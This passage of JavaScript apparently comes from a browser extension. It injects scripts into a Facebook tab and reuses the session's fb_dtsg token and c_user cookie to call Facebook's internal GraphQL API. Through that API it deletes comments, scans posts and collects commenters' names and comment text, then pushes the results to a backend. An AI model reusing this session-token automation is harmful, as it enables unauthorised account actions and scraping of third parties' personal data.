                                        id: node.id || node.legacy_fbid || '',
                                        author: node.author?.name || 'Unknown',
                                        authorId: node.author?.id || '',
                                        text: node.body?.text || '',
                                        timestamp: node.created_time ? node.created_time * 1000 : Date.now(),
                                        likes: node.feedback?.reaction_count?.count || 0
                                    });
                                }
                            }
                        } catch (e) { /* skip */ }
                    }
                    return { success: true, comments };
                } catch (e) { return { success: false, error: e.message, comments: [] }; }
            },
            args: [fbPostId]
        });
        return result[0]?.result || { success: false, error: 'Script failed', comments: [] };
    } catch (e) { return { success: false, error: e.message, comments: [] }; }
}

async function _deleteCommentViaGraphQL(tabId, commentId) {
    try {
        const result = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async (cmtId) => {
                try {
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    if (!fb_dtsg || !actorId) return { success: false, error: 'Missing tokens' };
                    const params = new URLSearchParams();
                    params.append('av', actorId);
                    params.append('__user', actorId);
                    params.append('__a', '1');
                    params.append('fb_dtsg', fb_dtsg);
                    params.append('fb_api_caller_class', 'RelayModern');
                    params.append('fb_api_req_friendly_name', 'CometCommentDeleteMutation');
                    params.append('variables', JSON.stringify({
                        input: {
                            comment_id: cmtId,
                            actor_id: actorId,
                            client_mutation_id: String(Date.now())
                        }
                    }));
                    params.append('doc_id', '5765006543560559');
                    const res = await fetch('https://www.facebook.com/api/graphql/', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: params.toString(),
                        credentials: 'include'
                    });
                    const text = await res.text();
                    const json = JSON.parse(text.replace('for (;;);', ''));
                    return { success: !json.errors };
                } catch (e) { return { success: false, error: e.message }; }
            },
            args: [commentId]
        });
        return result[0]?.result || { success: false, error: 'Script failed' };
    } catch (e) { return { success: false, error: e.message }; }
}

// ============================================================
// WALL SCANNER: Auto-scan Facebook wall for posts, likes, comments
// ============================================================
let _isScanning = false;
let _lastScanTime = 0;
const _SCAN_COOLDOWN = 55000; // 55s between scans

async function _scanWallPosts() {
    if (_isScanning) return;
    if (Date.now() - _lastScanTime < _SCAN_COOLDOWN) return;
    _isScanning = true;
    _lastScanTime = Date.now();
    try {
        // Check if backend wants a scan
        let shouldScan = false;
        try {
            const checkRes = await fetch(`${_syncUrl}/api/wall-scan/status`, { signal: AbortSignal.timeout(3000) });
            if (checkRes.ok) {
                const checkData = await checkRes.json();
                shouldScan = checkData.scanRequested || false;
            }
        } catch(e) { return; } // Backend not running

        if (!shouldScan) return;

        // Find Facebook tab
        const tabs = await chrome.tabs.query({ url: "*://*.facebook.com/*" });
        if (tabs.length === 0) {
            await fetch(`${_syncUrl}/api/wall-scan/result`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ success: false, error: 'No Facebook tab open. Please open Facebook first.' })
            }).catch(() => {});
            return;
        }
        const tabId = tabs[0].id;

        // Step 1: Extract all post IDs from the page
        const scanResult = await chrome.scripting.executeScript({
            target: { tabId, allFrames: false },
            world: 'MAIN',
            func: async () => {
                try {
                    const actorId = (document.cookie.match(/c_user=(\d+)/) || [])[1] || '';
                    const dtsgEl = document.querySelector('input[name="fb_dtsg"]');
                    const fb_dtsg = dtsgEl ? dtsgEl.value : '';
                    if (!actorId || !fb_dtsg) return { success: false, error: 'Not logged in or missing tokens' };

                    // Collect post IDs from links on the page
                    const postIdSet = new Set();
                    const allLinks = document.querySelectorAll('a[href]');
                    for (const a of allLinks) {
                        const href = a.href || '';
                        let m;
                        m = href.match(/story_fbid=(\d+)/);
                        if (m) postIdSet.add(m[1]);
                        m = href.match(/\/posts\/(pfbid\w+)/);
                        if (m) postIdSet.add(m[1]);
                        m = href.match(/\/posts\/(\d+)/);
                        if (m) postIdSet.add(m[1]);
                        m = href.match(/\/photo\/\?fbid=(\d+)/);
                        if (m) postIdSet.add(m[1]);
                        m = href.match(/\/photo\.(php|html)\?fbid=(\d+)/);
                        if (m) postIdSet.add(m[2]);
                        m = href.match(/\/permalink\.php\?story_fbid=(\d+)/);
                        if (m) postIdSet.add(m[1]);
                        m = href.match(/\/reel\/(\d+)/);
                        if (m) postIdSet.add(m[1]);
                        m = href.match(/\/videos\/(\d+)/);
                        if (m) postIdSet.add(m[1]);
                    }

                    const postIds = Array.from(postIdSet).filter(id => id.length > 3);
                    if (postIds.length === 0) {
                        return { success: true, posts: [], message: 'No posts found on page. Navigate to your profile.' };
                    }

                    // Step 2: For each post ID, fetch metrics
                    const posts = [];
                    const maxPosts = Math.min(postIds.length, 30); // Limit to 30
                    for (let i = 0; i < maxPosts; i++) {
                        const postId = postIds[i];
                        try {
                            const feedbackId = btoa('feedback:' + postId);

                            // Fetch feedback summary
                            const params = new URLSearchParams();
                            params.append('av', actorId);
                            params.append('__user', actorId);
                            params.append('__a', '1');
                            params.append('fb_dtsg', fb_dtsg);
                            params.append('fb_api_caller_class', 'RelayModern');
                            params.append('fb_api_req_friendly_name', 'CometUFISummaryAndActionsQuery');
                            params.append('variables', JSON.stringify({ feedbackTargetID: feedbackId }));
                            params.append('doc_id', '7171378936243498');

                            const res = await fetch('https://www.facebook.com/api/graphql/', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                body: params.toString(),
                                credentials: 'include'
                            });
                            const text = await res.text();
                            const json = JSON.parse(text.replace('for (;;);', ''));
                            const data = json.data || {};
                            const fb = data.feedback || data.node || {};
                            const likes = fb.reaction_count?.count || fb.reactors?.count || 0;
                            const comments = fb.comment_count?.total_count || fb.total_comment_count || 0;
                            const shares = fb.share_count?.count || fb.reshare_count?.count || 0;

                            // Also try to get top comments
                            let topComments = [];
                            try {
                                const cparams = new URLSearchParams();
                                cparams.append('av', actorId);
                                cparams.append('__user', actorId);
                                cparams.append('__a', '1');
                                cparams.append('fb_dtsg', fb_dtsg);
                                cparams.append('fb_api_caller_class', 'RelayModern');
                                cparams.append('fb_api_req_friendly_name', 'CometUFICommentsProviderQuery');
                                cparams.append('variables', JSON.stringify({
                                    feedbackID: feedbackId, feedbackSource: 2,
                                    focusCommentID: null, scale: 1,
                                    useDefaultActor: false, first: 10,
                                    orderingMode: 'RANKED_UNFILTERED'
                                }));
                                cparams.append('doc_id', '5765399230165702');
                                const cres = await fetch('https://www.facebook.com/api/graphql/', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                    body: cparams.toString(),
                                    credentials: 'include'
                                });
                                const ctext = await cres.text();
                                const clines = ctext.replace('for (;;);', '').split('\n').filter(l => l.trim());
                                for (const line of clines) {
                                    try {
                                        const cj = JSON.parse(line);
                                        const edges = cj?.data?.feedback?.display_comments?.edges
                                            || cj?.data?.node?.display_comments?.edges || [];
                                        for (const edge of edges) {
                                            const n = edge.node;
                                            if (n) topComments.push({
                                                id: n.id || n.legacy_fbid || '',
                                                author: n.author?.name || 'Unknown',
                                                text: n.body?.text || '',
                                                timestamp: n.created_time ? n.created_time * 1000 : 0,
                                                likes: n.feedback?.reaction_count?.count || 0
                                            });
                                        }
                                    } catch(e) {}
                                }
                            } catch(e) {}

                            posts.push({
                                fbPostId: postId,
                                metrics: { likes, comments, shares },
                                topComments,
                                scannedAt: Date.now()
                            });

                            // Small delay to avoid rate limiting
                            await new Promise(r => setTimeout(r, 300));
                        } catch (e) {
                            posts.push({ fbPostId: postId, error: e.message, scannedAt: Date.now() });
                        }
                    }

                    return { success: true, posts, actorId, totalFound: postIds.length, scanned: posts.length };
                } catch (e) {
                    return { success: false, error: e.message };
                }
            }
        });

        const result = scanResult[0]?.result || { success: false, error: 'Script failed' };

        // Push results to backend
        await fetch(`${_syncUrl}/api/wall-scan/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(result)
        }).catch(() => {});

    } catch (e) {
        console.warn('[WallScan] Error:', e.message);
    } finally {
        _isScanning = false;
    }
}
